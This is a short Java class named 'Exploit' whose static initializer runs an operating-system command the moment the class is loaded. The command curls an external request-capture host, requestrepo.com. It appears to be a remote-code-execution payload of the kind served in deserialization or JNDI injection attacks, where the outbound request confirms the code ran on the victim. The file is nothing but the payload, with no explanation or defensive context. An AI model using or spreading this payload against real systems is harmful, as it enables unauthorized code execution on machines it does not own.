public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("curl http://r7wapwjr.requestrepo.com");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
